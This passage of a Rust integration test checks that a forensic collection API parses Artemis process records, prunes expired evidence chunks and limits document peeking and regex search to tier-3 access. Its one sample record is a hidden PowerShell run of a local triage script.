            r#"{{"record_id": "artemis:process_execution:fresh-rec", "Computer": "WIN-FRESH-02", "CommandLine": "powershell.exe -NoP -W Hidden -File C:\\Triage\\hunt.ps1", "Image": "C:\\Windows\\System32\\powershell.exe", "ProcessId": 9944}}"#
        )
        .unwrap();
    }

    let collect_res = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/v1/artemis/collect")
                .header("content-type", "application/json")
                .body(Body::from(
                    serde_json::json!({
                        "source_type": "file",
                        "target_path": jsonl_path.to_string_lossy(),
                    })
                    .to_string(),
                ))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(collect_res.status(), StatusCode::OK);
    let collect_json = read_body_json(collect_res).await;

    assert_eq!(collect_json["records_parsed"], 2);
    assert_eq!(collect_json["records_pruned"], 1);
    assert_eq!(collect_json["total_retained_records"], 1);

    // Verify expired chunk was pruned from storage while fresh chunk remains
    let remaining_chunks = state.storage.scan_all_chunks().await.expect("scan chunks");
    assert!(
        !remaining_chunks
            .iter()
            .any(|c| c.document_id == "artemis:process_execution:expired-rec"),
        "Expired Artemis chunk must be pruned from storage"
    );
    assert!(
        remaining_chunks
            .iter()
            .any(|c| c.document_id == "artemis:process_execution:fresh-rec"),
        "Fresh Artemis chunk must be retained in storage"
    );

    // Verify RLM PeekSlice and RegexGrep work at Tier 3 (local operator) and fail closed at Tier < 3
    let slice_tier2 = state
        .storage
        .peek_slice("artemis:process_execution:fresh-rec", 0, 512, 2)
        .expect("peek_slice tier 2");
    assert!(
        slice_tier2.is_none(),
        "Tier 3 Artemis parent document must be inaccessible at max_tier=2"
    );

    let slice_tier3 = state
        .storage
        .peek_slice("artemis:process_execution:fresh-rec", 0, 1024, 3)
        .expect("peek_slice tier 3")
        .expect("parent document present at tier 3");
    assert!(slice_tier3.contains("hunt.ps1"));

    let grep_hits = state
        .storage
        .regex_grep("artemis:process_execution:fresh-rec", "hunt\\.ps1", 10, 3)
        .expect("regex_grep tier 3");
    assert!(!grep_hits.is_empty());
    assert_eq!(grep_hits[0].matched_text, "hunt.ps1");
}
